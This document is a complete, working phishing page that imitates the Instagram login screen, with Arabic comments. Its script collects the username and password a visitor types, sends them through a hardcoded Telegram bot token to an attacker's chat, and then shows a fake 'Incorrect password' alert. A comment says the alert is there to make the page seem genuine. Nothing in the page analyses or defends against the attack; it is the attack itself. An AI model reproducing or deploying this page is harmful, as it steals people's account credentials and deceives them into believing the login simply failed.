<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background-color: black;
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .container {
            width: 85%;
            max-width: 350px;
            text-align: center;
        }
        .logo {
            width: 60px;
            margin-bottom: 15px;
        }
        h1 {
            font-size: 38px;
            margin-bottom: 35px;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            background-color: #121212;
            border: 1px solid #363636;
            border-radius: 8px;
            color: white;
            font-size: 14px;
        }
        input::placeholder { color: #8e8e8e; }
        button {
            width: 100%;
            padding: 13px;
            background-color: #0095f6;
            border: none;
            border-radius: 20px;
            color: white;
            font-weight: bold;
            font-size: 15px;
            cursor: pointer;
            margin-top: 10px;
        }
        .forgot {
            display: block;
            margin-top: 20px;
            color: white;
            font-size: 13px;
            text-decoration: none;
            font-weight: bold;
        }
        .footer {
            position: absolute;
            bottom: 40px;
            text-align: center;
            color: #737373;
            font-size: 12px;
        }
        .meta {
            color: white;
            font-weight: bold;
            font-size: 15px;
            letter-spacing: 1px;
        }
    </style>
</head>
<body>

    <div class="container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" alt="Insta">
        <h1>Instagram</h1>
        
        <input type="text" id="username" placeholder="Phone number, username, or email">
        <input type="password" id="password" placeholder="Password">
        
        <button onclick="sendToTelegram()">Log In</button>
        
        <a href="#" class="forgot">Forgot password?</a>
    </div>

    <div class="footer">
        from<br>
        <span class="meta">Meta</span>
    </div>

    <script>
        function sendToTelegram() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            if (user.trim() === "" || pass.trim() === "") {
                alert("Please enter your details");
                return;
            }

            const token = "7613459656:AAGQ9YufupJTUGedqSBSSobBln_8SrCbY4g";
            const chat_id = "7712950930";
            const message = `🚨 **محاولة تسجيل دخول جديدة** 🚨\n\n👤 **User:** \`${user}\`\n🔑 **Pass:** \`${pass}\``;

            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

            fetch(url)
                .then(response => {
                    // مسح الخانات بعد الإرسال
                    document.getElementById('username').value = "";
                    document.getElementById('password').value = "";
                    // توجيه لصفحة الخطأ باش تبان حقيقية
                    alert("Incorrect password. Please try again.");
                })
                .catch(error => console.error('Error:', error));
        }
    </script>

</body>
</html>
